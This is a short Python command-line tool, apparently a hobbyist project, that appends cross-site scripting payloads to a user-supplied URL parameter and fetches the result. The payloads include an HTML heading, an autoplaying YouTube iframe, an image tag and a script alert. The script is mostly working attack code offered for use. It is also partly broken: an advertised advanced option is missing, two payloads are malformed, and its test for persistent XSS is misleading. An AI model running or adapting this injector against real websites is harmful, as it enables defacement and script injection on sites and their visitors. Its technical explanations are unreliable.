#!/usr/bin/python
#Persistent XSS Injector with configurated choices.
#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation.
#I do not take responsability for your acts.
#It is just developed wanting to be a helpful program for students of python
#and students of PenTesting.
#Cardangi


from sys import argv
import os, urllib.request, urllib.error, socket
from urllib.parse import urlparse 


def menu():
    os.system("cls")
    
    print ("\nYou need to tip an arg. Here are the options:\n   ")

    argo1 = (' --target'+'\t'+ 'Choose the URL target').expandtabs(30)
    argo3 = (' --adv'+'\t'+ 'Advanced XSS Settings').expandtabs(30)
    print (argo1 + "\n"  +  argo3)
try:
    if argv[1] == "--target":
        os.system("cls")
        print ("Put your target, like: http://www.blablabla.com/xssfail.php?= (copy until the signal =)")
        url = input(str("> "))
        os.system("cls") 
        print ("Select the XSS between the options:\n")
        print ("1 - Big text saying 'testing xss'")
        print ("\n2- Music (You would be able to choose the music soon.) ")
        print ("\n3 - Anonymous image ROFL")
        print ("\n4 - Alert your message")
        print ("\n\nFor more options check -adv arg")
        xss = input(str("\n> "))
        if xss == "1":
            xssdois = "<h1>testing xss</h1>"
        if xss == "2":
            xssdois = '<iframe width="854" height="480" src="https://www.youtube.com/embed/_ftrH1twEFw?autoplay=1" frameborder="0" allowfullscreen></iframe>'
        if xss == "3":
            xssdois ='<img src="https://imgnzn-a.akamaized.net/2015/12/09/09141751293074.jpg" style="width:300px"'
        if xss == "4":
            messages = str(input("Ur msg > "))
            xssdois ="<script>alert(" + messages + ")</script>;"
        print (url)
        try:
            resultfinal = (url + xssdois)
            req = urllib.request.Request(resultfinal)
            resp = urllib.request.urlopen(req)
            dadosFinais = resp.read()
            os.system('mode 100,48')
            os.system('cls')
            print ("Final Result from XSS Injection:" + resultfinal + "\n\n\n")
            print ("Minified Html Results saved in results.txt: \n")
            results = open("results.txt", "wb")
            results.write (dadosFinais)
            results.close()
            print ("\n\nThis is XSS. If you want to see if is persistent, go to the website and press Reload/F5.")
            print ("If the change still in the website when you press F5 (And CTRL + F5 for cache cleaning), that's")
            print ("Mean the site is vulnerable to Persistent XSS.")
                   


            
        except ValueError:
            os.system("cls")
            print ("Invalid Url")
except IndexError:
    menu()
